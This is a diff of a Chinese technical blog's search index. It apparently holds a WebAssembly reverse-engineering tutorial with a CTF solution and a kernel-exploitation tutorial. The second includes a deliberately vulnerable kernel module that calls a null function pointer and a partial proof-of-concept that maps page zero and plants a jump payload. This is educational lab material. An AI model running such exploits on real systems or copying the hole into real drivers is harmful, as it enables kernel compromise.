@@ -1,109 +1,1929 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>linux驱动模块编写</title>
-      <link href="2021/05/12/linux-qu-dong-mo-kuai-bian-xie/"/>
-      <url>2021/05/12/linux-qu-dong-mo-kuai-bian-xie/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><blockquote><p>Linux系统分为内核态和用户态，只有内核态才有访问硬件设备的权限。驱动实际上是内核态提供给用户态访问硬件设备的API。</p></blockquote><h1 id="1-demo——以HelloWorld为例"><a href="#1-demo——以HelloWorld为例" class="headerlink" title="1. demo——以HelloWorld为例"></a>1. demo——以HelloWorld为例</h1><h2 id="1-1-驱动模块代码的组成"><a href="#1-1-驱动模块代码的组成" class="headerlink" title="1.1. 驱动模块代码的组成"></a>1.1. 驱动模块代码的组成</h2><ol><li>头文件</li><li>模块装载函数和卸载函数的<strong>实现</strong></li><li>模块装载函数和卸载函数的<strong>声明</strong></li><li>其它信息，例如协议、作者等</li></ol><h2 id="1-2-驱动代码"><a href="#1-2-驱动代码" class="headerlink" title="1.2. 驱动代码"></a>1.2. 驱动代码</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">//hello_drv.c#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;//GPL and authorMODULE_LICENSE("GPL");MODULE_AUTHOR("XXX");//install modulestatic int __init hello_drv_init(void){    printk("--------------install hello_drv--------------\n");    return 0;}//uninstall module//NOTE：uninstall function do not have return valuestatic void __exit hello_drv_exit(void){    printk("--------------uninstall hello_drv--------------\n");}//declarationmodule_init(hello_drv_init);module_exit(hello_drv_exit);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>题外话，复习一下static关键词，面试有被问到，不会......<br>  被static修饰的函数仅在当前文件内可以使用<br>  被static修饰的变量会被默认初始化为0(且程序逆运行过程中只初始化1次)，它的可见范围也仅限于当前文件</p></blockquote><h2 id="1-3-Makefile"><a href="#1-3-Makefile" class="headerlink" title="1.3. Makefile"></a>1.3. Makefile</h2><pre class="line-numbers language-none"><code class="language-none">CUR_DIR := $(shell pwd)     #驱动代码所在目录ROOTFS_DIR := ..            #文件系统根目录KERNEL_DIR := ../../../linux-5.4.5  #内核源码所在目录ifeq ($(KERNELRELEASE),)all:make -C $(KERNEL_DIR) M=$(CUR_DIR) modulesclean:make -C $(KERNEL_DIR) M=$(CUR_DIR) cleaninstall:cp -raf *.ko $(ROOTFS_DIR)/drv_moduleelseobj-m += hello_drv.oendif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Make过程描述：<br>第一次执行make时，KERNELRELEASE还没有被定义，所以执行<strong>伪目标</strong>all。make -C指定内核所在目录，当执行到这里的时候KERNELRELEASE就被定义了。M=$(CUR_DIR)即在当前目录下编译文件为模块，但是此时不知道编译哪个文件为模块。之后再次执行make，此时因为KERNELRELEASE已经被定义，执行else中的内容，将hello_drv.c编译成hello_drv.o并链接成hello_drv.ko。</p><h2 id="1-4-安装"><a href="#1-4-安装" class="headerlink" title="1.4. 安装"></a>1.4. 安装</h2><pre class="line-numbers language-none"><code class="language-none">lsmod:查看当前安装的驱动模块insmod:安装驱动模块 #在安装自己写的驱动的时候，有可能会报taints kernel的信息。                #这个不用管，因为我们自己写的模块不在内核的代码树里rmmod:删除驱动模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/%E5%AE%89%E8%A3%85%E9%A9%B1%E5%8A%A8.png" class=""><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://paper.seebug.org/779/">从 0 开始学 Linux 驱动开发(一)</a></li><li><a href="https://blog.csdn.net/fenglang1233307/article/details/79677590">简单的linux驱动模块编写</a></li></ol>]]></content>
-      
-      
+<search>
+  <entry>
+    <title>wasm逆向分析方法</title>
+    <url>/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/</url>
+    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><blockquote>
+<p>WebAssembly（缩写为Wasm）是基于堆栈的虚拟机的二进制指令格式。Wasm被设计为可编程C / C ++ / Rust等高级语言的可移植目标，可在Web上部署客户端和服务器应用程序。</p>
+</blockquote>
+<h1 id="2-WebAssembly文本格式"><a href="#2-WebAssembly文本格式" class="headerlink" title="2. WebAssembly文本格式"></a>2. WebAssembly文本格式</h1><h2 id="2-1-全局变量"><a href="#2-1-全局变量" class="headerlink" title="2.1. 全局变量"></a>2.1. 全局变量</h2><h3 id="2-1-1-global-get"><a href="#2-1-1-global-get" class="headerlink" title="2.1.1. global.get"></a>2.1.1. <code>global.get</code></h3><p>把全局变量的值推入栈顶。</p>
+<p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">global.get $global0
+
+且 global0 = d
+则有如下操作：
+
+|     |  ↘|  d  |      
+|  a  |    |  a  |   
+|  b  |    |  b  |   
+|  c  |    |  c  |      
+└─────┘    └─────┘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="2-1-2-global-set"><a href="#2-1-2-global-set" class="headerlink" title="2.1.2. global.set"></a>2.1.2. <code>global.set</code></h3><p>从栈顶弹出1个值，并将其设置为全局变量</p>
+<p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">global.set $global0
+
+则有如下操作：
+|  d  |↗  |     |      
+|  a  |    |  a  |   
+|  b  |    |  b  |      
+|  c  |    |  c  |      
+└─────┘    └─────┘，且global0 = d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="2-2-局部变量"><a href="#2-2-局部变量" class="headerlink" title="2.2. 局部变量"></a>2.2. 局部变量</h2><h3 id="2-2-1-local-get"><a href="#2-2-1-local-get" class="headerlink" title="2.2.1. local.get"></a>2.2.1. <code>local.get</code></h3><p>类似<code>global.get</code>,不同之处是它将局部变量入栈。</p>
+<h3 id="2-2-2-local-set"><a href="#2-2-2-local-set" class="headerlink" title="2.2.2. local.set"></a>2.2.2. <code>local.set</code></h3><p>类似<code>global.set</code>,不同之处是它将栈顶值弹出，并赋给1个局部变量。        </p>
+<h3 id="2-2-3-local-tee"><a href="#2-2-3-local-tee" class="headerlink" title="2.2.3. local.tee"></a>2.2.3. <code>local.tee</code></h3><p>与<code>local.set</code>类似，但是它不会将栈顶值弹出。</p>
+<p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">local.tee $var0
+
+则有如下操作：
+|  d  |↗ ↘|  d  |      
+|  a  |    |  a  |   
+|  b  |    |  b  |      
+|  c  |    |  c  |      
+└─────┘    └─────┘，且var0 = d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="2-3-内存操作"><a href="#2-3-内存操作" class="headerlink" title="2.3. 内存操作"></a>2.3. 内存操作</h2><h3 id="2-3-1-load"><a href="#2-3-1-load" class="headerlink" title="2.3.1. load"></a>2.3.1. <code>load</code></h3><p>以栈顶值为地址取数据</p>
+<p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">i64.load offset=88
+
+则有如下操作:
+|  d  |↗ ↘|M[d+88]|      
+|  a  |    |  a  |   
+|  b  |    |  b  |      
+|  c  |    |  c  |      
+└─────┘    └─────┘
+即将d出栈，将内存中d+88指向的1个64位数据入栈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="2-3-2-store"><a href="#2-3-2-store" class="headerlink" title="2.3.2. store"></a>2.3.2. <code>store</code></h3><p>将栈顶值出栈，存到以下一个栈顶值为地址的内存中，即<code>M[stack[-2]] = stack[-1]</code></p>
+<p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">local.get $var0
+local.get $var1
+i64.store
+
+| v[1]|↗  |     |      
+| v[0]|↗  |     |   
+|  b  |    |  b  |      
+|  c  |    |  c  |      
+└─────┘    └─────┘
+且M[v[0]] = v[1];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="2-4-函数调用"><a href="#2-4-函数调用" class="headerlink" title="2.4. 函数调用"></a>2.4. 函数调用</h2><h3 id="2-4-1-call"><a href="#2-4-1-call" class="headerlink" title="2.4.1. call"></a>2.4.1. <code>call</code></h3><p>函数的参数从左至右依次入栈，调用目标由立即数指定，调用结束以后参数全部出栈，返回值入栈(wasm1.0规定返回值至多有1个)</p>
+<p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">call $func6
+
+| p1  |↗  |     |      
+| p0  |↗  | ret |   
+|  b  |    |  b  |      
+|  c  |    |  c  |      
+└─────┘    └─────┘
+即调用函数func6(p0,p1),返回值为ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="2-5-wat文件格式解析"><a href="#2-5-wat文件格式解析" class="headerlink" title="2.5. .wat文件格式解析"></a>2.5. <code>.wat</code>文件格式解析</h2><h3 id="2-5-1-导入表"><a href="#2-5-1-导入表" class="headerlink" title="2.5.1. 导入表"></a>2.5.1. 导入表</h3><p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">(import "a" "a" (func (;0;) (type 13)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即wasm导入了名为a的js模块中的a库函数，在js代码中的表现如下:</p>
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/importJS.png" class="">  
+
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/asmLibraryArg.png" class="">
+
+<p>即wasm中func0实际上就是JS代码中的<code>___assert_fail</code>函数</p>
+<h3 id="2-5-2-导出表"><a href="#2-5-2-导出表" class="headerlink" title="2.5.2. 导出表"></a>2.5.2. 导出表</h3><p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">(export "f" (func 27))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即wasm将函数func27导出给JS调用，导出的函数名为"f"。</p>
+<h3 id="2-5-3-数据段"><a href="#2-5-3-数据段" class="headerlink" title="2.5.3. 数据段"></a>2.5.3. 数据段</h3><p>Example:</p>
+<pre class="line-numbers language-none"><code class="language-none">(data (;0;) (i32.const 1024) "0077678b0f3e6cf6e263e6fe3a4c39f3\00length is not valid\00Success\00Oops....something wrong\00n &amp;&amp; \22n is null\22\00bn.c\00bignum_from_int\00bignum_from_string\00str &amp;&amp; \22str is null\22\00nbytes &gt; 0 &amp;&amp; \22nbytes must be positive\22\00(nbytes &amp; 1) == 0 &amp;&amp; \22string format must be in hex -&gt; equal number of bytes\22\00(nbytes % (sizeof(uint32_t) * 2)) == 0 &amp;&amp; \22string length must be a multiple of (sizeof(DTYPE) * 2) characters\22\00%8x\00bignum_to_string\00%.08x\00a &amp;&amp; \22a is null\22\00bignum_add\00b &amp;&amp; \22b is null\22\00c &amp;&amp; \22c is null\22\00bignum_mul\00bignum_cmp\00dst &amp;&amp; \22dst is null\22\00bignum_assign\00src &amp;&amp; \22src is null\22\00-+   0X0x\00(null)\00\00\11\00\0a\00\11\11\11\00\00\00\00\05\00\00\00\00\00\00\09\00\00\00\00\0b\00\00\00\00\00\00\00\00\11\00\0f\0a\11\11\11\03\0a\07\00\01\00\09\0b\0b\00\00\09\06\0b\00\00\0b\00\06\11\00\00\00\11\11\11")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即程序内存偏移为1024的地方，存放的数据为"0077678b0f3......"</p>
+<h1 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3. 静态分析"></a>3. 静态分析</h1><h2 id="3-1-反汇编"><a href="#3-1-反汇编" class="headerlink" title="3.1. 反汇编"></a>3.1. 反汇编</h2><h3 id="3-1-1-ida自带WebAssembly插件-本人没用过"><a href="#3-1-1-ida自带WebAssembly插件-本人没用过" class="headerlink" title="3.1.1. ida自带WebAssembly插件(本人没用过)"></a>3.1.1. ida自带WebAssembly插件(本人没用过)</h3><h3 id="3-1-2-使用WABT"><a href="#3-1-2-使用WABT" class="headerlink" title="3.1.2. 使用WABT"></a>3.1.2. 使用<a href="https://github.com/WebAssembly/wabt">WABT</a></h3><pre class="line-numbers language-none"><code class="language-none">./wasm2wat test.wasm -o test.wat    //获取字节码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="3-2-反编译"><a href="#3-2-反编译" class="headerlink" title="3.2. 反编译"></a>3.2. 反编译</h2><h3 id="3-2-1-使用WABT"><a href="#3-2-1-使用WABT" class="headerlink" title="3.2.1. 使用WABT:"></a>3.2.1. 使用WABT:</h3><p><code>./wasm2c test.wasm -o test.c</code>     </p>
+<p>得到<code>.c</code>文件和<code>.h</code>文件。<br>这一步得到的代码可读性仍然很差，光是行数也很吓人。</p>
+<p>另外还可以使用wasm-decompiler:<br><code>./wasm-decompiler test.wasm</code><br>得到的是伪C代码，效果也不是很好。</p>
+<h3 id="3-2-2-优化——gcc重新编译"><a href="#3-2-2-优化——gcc重新编译" class="headerlink" title="3.2.2. 优化——gcc重新编译"></a>3.2.2. 优化——gcc重新编译</h3><p>将wasm2c反编译得到的<code>.c</code>文件和<code>.h</code>文件和WABT中的<code>wasm-rt.h</code>放在一个文件夹下重新编译。</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -c test.c -o test.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这一步要注意，链接会出错(因为很多函数没有具体实现)，所以我们只生成目标文件即可。<br>到这里我们就得到了可以用ida分析的elf文件。</p>
+<h1 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4. 动态分析"></a>4. 动态分析</h1><p>python搭建临时服务器</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m http.server &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后双击html文件，按<code>f12</code>，然后按<code>ctrl+r</code>即可开始调试     </p>
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/wasm%E8%B0%83%E8%AF%95.png" class="" title="调试窗口">   
+<p>如图中右侧窗口所示，我们可以使用谷歌自带的wasm调试器设置断点、观察堆栈、局部变量、调用栈等信息。</p>
+<h1 id="5-实战"><a href="#5-实战" class="headerlink" title="5. 实战"></a>5. 实战</h1><h2 id="5-1-2021蓝帽杯calc"><a href="#5-1-2021蓝帽杯calc" class="headerlink" title="5.1. 2021蓝帽杯calc"></a>5.1. 2021蓝帽杯calc</h2><h3 id="5-1-1-分析html和js代码"><a href="#5-1-1-分析html和js代码" class="headerlink" title="5.1.1 分析html和js代码"></a>5.1.1 分析html和js代码</h3><img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/%E8%93%9D%E5%B8%BD%E6%9D%AFcalc_html%E9%A1%B5%E9%9D%A2.jpg" class="" title="html页面">    
+<p>主要判断逻辑在<code>check_input</code>函数中。 </p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+function check_input(){var e=document.getElementById("input_char").value;console.log(e);Module.ccall("entry","number",["string"],[e])}
+&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>该函数读取输入，并将输入作为ccall函数的参数。<br>js代码中ccall的定义如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">function ccall(ident, returnType, argTypes, args, opts) {
+    var toC = {
+        "string": function(str) {
+            var ret = 0;
+            if (str !== null &amp;&amp; str !== undefined &amp;&amp; str !== 0) {
+                var len = (str.length &lt;&lt; 2) + 1;
+                ret = stackAlloc(len);
+                stringToUTF8(str, ret, len)
+            }
+            return ret
+        },
+        "array": function(arr) {
+            var ret = stackAlloc(arr.length);
+            writeArrayToMemory(arr, ret);
+            return ret
+        }
+    };
+    function convertReturnValue(ret) {
+        if (returnType === "string") return UTF8ToString(ret);
+        if (returnType === "boolean") return Boolean(ret);
+        return ret
+    }
+    var func = getCFunc(ident);
+    var cArgs = [];
+    var stack = 0;
+    if (args) {
+        for (var i = 0; i &lt; args.length; i++) {
+            var converter = toC[argTypes[i]];
+            if (converter) {
+                if (stack === 0) stack = stackSave();
+                cArgs[i] = converter(args[i])
+            } else {
+                cArgs[i] = args[i]
+            }
+        }
+    }
+    var ret = func.apply(null, cArgs);
+    ret = convertReturnValue(ret);
+    if (stack !== 0) stackRestore(stack);
+    return ret
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该函数首先调用getCFunc("entry"),getCFunc定义如下：  </p>
+<pre class="line-numbers language-none"><code class="language-none">function getCFunc(ident) {
+    var func = Module["_" + ident];
+    assert(func, "Cannot call unknown function " + ident + ", make sure it is exported");
+    return func
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其中Module["_entry"]如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">var _entry = Module["_entry"] = function() {
+    return (_entry = Module["_entry"] = Module["asm"]["h"]).apply(null, arguments)
+};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>这里的<code>Module["asm"]["h"]</code>其实是调用了<code>.wasm</code>中的导出函数，如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">(export "f" (func 27))
+(export "g" (func 86))
+(export "h" (func 75))
+(export "i" (table 0))
+(export "j" (func 48))
+(export "k" (func 47))
+(export "l" (func 46))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>即函数<code>check_input</code>中的<code>func</code>实际上指向<code>.wasm</code>文件中的func75(同时也是IDA中的<code>_w2c_h</code>函数，如下)</p>
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/w2c_h.png" class="" title="w2c_h函数">
+
+<p>接下来就是将我们的输入存放到内存中，然后去调用func75。</p>
+<p>根据动态调试结果，func28返回输入的长度。</p>
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/%E9%95%BF%E5%BA%A6%E9%AA%8C%E8%AF%81.png" class="">    
+
+<p>func45验证输入正确与否(一堆跳转，一看就是字符串比对,目标字符串为数据段中的"0077678b0f3e6cf6e263e6fe3a4c39f3")。</p>
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/func45.png" class="">
+
+<p>函数返回非0则调用f29(1085),否则调用f29(1077)。其中1077指向的数据为"sucess",f29为输出函数，它调用了函数$a.b.<br>那么前面的func28之后一定还有对输入进行加密的逻辑。调试中发现，加密后的输出被存放的内存偏移为func75中早就定义好的全局变量<code>w2c_g0</code>。</p>
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/func81.png" class="">  
+<img src="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/moutput.png" class="">  
+
+<p>更改几次输入很容易发现规律,例如:我们的输入为"123",则输出为:</p>
+<p>$$((128*ord('1'))+ord('2'))*128+ord('3')$$</p>
+<p>解密脚本:</p>
+<pre class="line-numbers language-none"><code class="language-none">bigNum = int("0077678b0f3e6cf6e263e6fe3a4c39f3",16)
+res = []
+while bigNum != 0:
+    res.append(bigNum%128)
+    bigNum = bigNum &gt;&gt; 7
+print(''.join([chr(i) for i in res[::-1]]))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6. 参考文章"></a>6. 参考文章</h1><ol>
+<li><a href="https://xz.aliyun.com/t/5170">一种Wasm逆向静态分析方法</a></li>
+<li><a href="https://juejin.cn/post/6844904077411745800#heading-4">Wasm介绍之4：函数调用</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format">理解WebAssembly文本格式</a></li>
+</ol>
+<h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><a href="/2021/05/01/wasm-ni-xiang-fen-xi-fang-fa/calc.7z" title="calc.7z">calc.7z</a>
+]]></content>
       <categories>
-          
-          <category> linux </category>
-          
-          <category> 驱动 </category>
-          
+        <category>逆向工程</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 驱动 </tag>
-            
-        </tags>
-      
-    </entry>
+      <tags>
+        <tag>wasm</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kernel-pwn之demo-null-deference</title>
+    <url>/2021/05/12/kernel-pwn-zhi-demo-null-deference/</url>
+    <content><![CDATA[<h1 id="内核API函数proc-create"><a href="#内核API函数proc-create" class="headerlink" title="内核API函数proc_create"></a>内核API函数<a href="https://www.jianshu.com/p/2ddd32527367">proc_create</a></h1><blockquote>
+<p>在新版内核中，proc_create函数取代了create_proc_entry</p>
+</blockquote>
+<h2 id="Proc文件系统"><a href="#Proc文件系统" class="headerlink" title="Proc文件系统"></a>Proc文件系统</h2><p>虚拟的文件系统，理解为内核对用户开放的接口，用户通过它读取、修改内核进程数据</p>
+<h3 id="创建porc-file"><a href="#创建porc-file" class="headerlink" title="创建porc file"></a>创建porc file</h3><ul>
+<li>实现file_operation结构体，主要是实现read和write接口</li>
+<li>用proc_create注册到内核</li>
+<li>然后在/proc目录下可以找到对应的文件，通过它可以实现用户进程与内核的通信<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3></li>
+<li>补充  <ul>
+<li>module_param()<br>在用户态中，可以通过main()函数的参数传递命令行参数给程序，在内核态中，则使用module_param()传递命令行参数。<br>原型:module_param(name,type,perm)<br>name：既是用户看到的参数名，又是模块内接受参数的变量；<br>type: 表示参数的类型;<br>perm: 指定了在sysfs中相应文件的访问权限;            </li>
+<li>copy_to_user/copy_from_user<br>内核空间和用户空间的内存不能直接互访，需要借助上述两个函数完成内核空间与用户空间之间数据的拷贝。<br>新版本的内核中被raw_copy_to(from)_user代替。</li>
+</ul>
+</li>
+<li>示例代码<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;linux/module.h&gt;
+#include &lt;linux/moduleparam.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/kernel.h&gt;   
+#include &lt;linux/proc_fs.h&gt;
+#include &lt;asm/uaccess.h&gt;
+#define BUFSIZE  100
+
+
+MODULE_LICENSE("Dual BSD/GPL");
+MODULE_AUTHOR("Liran B.H");
+
+static int irq=20;
+module_param(irq,int,0660);
+
+static int mode=1;
+module_param(mode,int,0660);
+
+static struct proc_dir_entry *ent;
+
+// 修改irq、mode值
+static ssize_t mywrite(struct file *file, const char  __user *ubuf, size_t count, loff_t *ppos) 
+{
+        int num,c,i,m;
+        char buf[BUFSIZE];
+        if(*ppos &gt; 0 || count &gt; BUFSIZE)
+                return -EFAULT;
+        if(raw_copy_from_user(buf, ubuf, count))
+                return -EFAULT;
+        num = sscanf(buf,"%d %d",&amp;i,&amp;m);
+        if(num != 2)
+                return -EFAULT;
+        irq = i; 
+        mode = m;
+        c = strlen(buf);
+        *ppos = c;
+        return c;
+}
+
+// 读取irq、mode值
+static ssize_t myread(struct file *file, char __user *ubuf,  size_t count, loff_t *ppos) 
+{
+        char buf[BUFSIZE];
+        int len=0;
+        if(*ppos &gt; 0 || count &lt; BUFSIZE)
+                return 0;
+        len += sprintf(buf,"irq = %d\n",irq);
+        len += sprintf(buf + len,"mode = %d\n",mode);
+        
+        if(raw_copy_to_user(ubuf,buf,len))
+                return -EFAULT;
+        *ppos = len;
+        return len;
+}
+
+// 定义file_operations数据结构
+static struct file_operations myops = 
+{
+        .owner = THIS_MODULE,
+        .read = myread,
+        .write = mywrite,
+};
+
+static int simple_init(void)
+{
+        // 注册1个名称为mydev的proc文件，权限为666
+        // 对应的file_operations为myops
+        ent=proc_create("mydev",0666,NULL,&amp;myops);
+        printk(KERN_ALERT "hello...\n");
+        return 0;
+}
+
+static void simple_cleanup(void)
+{
+        // 删除ent指向的porc文件
+        proc_remove(ent);
+        printk(KERN_WARNING "bye ...\n");
+}
+
+// 模块声明
+module_init(simple_init);       
+module_exit(simple_cleanup);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>Makefile<br>参考<a href="/2021/05/12/linux-qu-dong-mo-kuai-bian-xie/" title="linux驱动模块编写">linux驱动模块编写</a></li>
+<li>测试<img src="/2021/05/12/kernel-pwn-zhi-demo-null-deference/proc_create%E6%B5%8B%E8%AF%95.jpg" class="">
+<ul>
+<li>user_app.c<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+ 
+void main(void)
+{
+    char buf[100];
+    int fd = open("/proc/mydev", O_RDWR);
+    read(fd, buf, 100);
+    puts(buf);
+ 
+    lseek(fd, 0 , SEEK_SET);
+    write(fd, "33 4", 5);
     
-    
-    
-    <entry>
-      <title>kernel-pwn之demo-null-deference</title>
-      <link href="2021/05/12/kernel-pwn-zhi-demo-null-deference/"/>
-      <url>2021/05/12/kernel-pwn-zhi-demo-null-deference/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
+    lseek(fd, 0 , SEEK_SET);
+    read(fd, buf, 100);
+    puts(buf);
+}   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+gcc -static user_app.c -o user_app</li>
+<li>测试                <img src="/2021/05/12/kernel-pwn-zhi-demo-null-deference/proc_create%E6%B5%8B%E8%AF%952.png" class=""></li>
+</ul>
+</li>
+</ul>
+<h1 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;linux/module.h&gt;
+#include &lt;linux/moduleparam.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/kernel.h&gt;   
+#include &lt;linux/proc_fs.h&gt;
+#include &lt;asm/uaccess.h&gt;
+
+static struct proc_dir_entry *bug1;
+
+void (*my_funptr)(void);
+ 
+static ssize_t bug1_write(struct file *file, const char __user *ubuf,  size_t count, loff_t *ppos)
+{
+        my_funptr();
+        return count;
+}
+
+static struct file_operations bugops = 
+{
+        .owner = THIS_MODULE,
+        .write = bug1_write,
+};
+
+static int __init null_dereference_init(void)
+{
+        printk(KERN_ALERT "null_dereference driver init!n");
+        bug1=proc_create("bug1",0666,NULL,&amp;bugops);
+        return 0;
+}
+
+static void __exit null_dereference_exit(void)
+{
+        proc_remove(bug1);
+        printk(KERN_ALERT "null_dereference driver exit!n");
+}
+
+module_init(null_dereference_init);
+module_exit(null_dereference_exit);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用方式参考上文</p>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">//poc.c
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+char payload[] = "xe9xeaxbexadx0b";// jmp 0xbadbeef
+
+int main(){
+    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
+    memcpy(0, payload, sizeof(payload));
+    int fd = open("/proc/bug1", O_WRONLY);
+    write(fd, "null", 4);
+    return 0;
